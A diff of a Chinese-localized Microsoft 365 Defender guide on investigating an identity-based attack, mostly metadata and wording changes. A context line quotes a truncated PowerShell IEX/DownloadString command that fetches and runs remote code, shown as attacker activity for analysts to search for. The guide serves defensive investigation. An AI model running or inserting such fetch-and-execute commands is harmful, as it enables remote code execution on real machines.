@@ -22,12 +22,12 @@ search.appverid:
 - MOE150
 - MET150
 ms.technology: m365d
-ms.openlocfilehash: 204530b8b4a87215053ddcb0434e40e45271da3d
-ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
+ms.openlocfilehash: 57a324310458dc15f5edcd6012ab381bb4d5041d902b8871d85cb318f0e7023e
+ms.sourcegitcommit: a1b66e1e80c25d14d67a9b46c79ec7245d88e045
 ms.translationtype: MT
 ms.contentlocale: zh-CN
-ms.lasthandoff: 06/08/2021
-ms.locfileid: "52841002"
+ms.lasthandoff: 08/05/2021
+ms.locfileid: "53873610"
 ---
 # <a name="example-of-an-identity-based-attack"></a>基于身份的攻击示例
 
@@ -36,11 +36,11 @@ ms.locfileid: "52841002"
 **适用于：**
 - Microsoft 365 Defender
 
-Microsoft Defender for Identity 可以帮助检测恶意尝试来破坏你组织中的身份。 由于 Defender for Identity 与 Microsoft 365 Defender 集成，因此安全分析师可以了解来自 Defender for Identity 的威胁，例如可疑的 Netlogon 特权提升尝试。
+Microsoft Defender for Identity 可以帮助检测恶意尝试来破坏你组织中的身份。 由于 Defender for Identity 与 Microsoft 365 Defender集成，因此安全分析师可以了解来自 Defender for Identity 的威胁，例如可疑的 Netlogon 特权提升尝试。
 
 ## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>分析 Microsoft Defender 中针对标识的攻击
 
-Microsoft 365Defender 允许分析员按事件页面的"**警报**"选项卡上的检测源筛选警报。 在下面的示例中，将检测源筛选为 Defender **for Identity**。 
+Microsoft 365 Defender分析员可以按事件页面的"警报"选项卡上的检测源筛选警报。 在下面的示例中，将检测源筛选为 Defender **for Identity**。 
 
 :::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="筛选 Defender for Identity 的检测源的示例":::
 
@@ -87,7 +87,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ```
 分析员可以通过在搜索栏中键入关键字来快速搜索关键字，以仅显示使用 PowerShell 创建的事件。 
 
-## <a name="next-step"></a>后续步骤
+## <a name="next-step"></a>下一步
 
 请参阅 [网络钓鱼调查](first-incident-path-phishing.md) 路径。
 
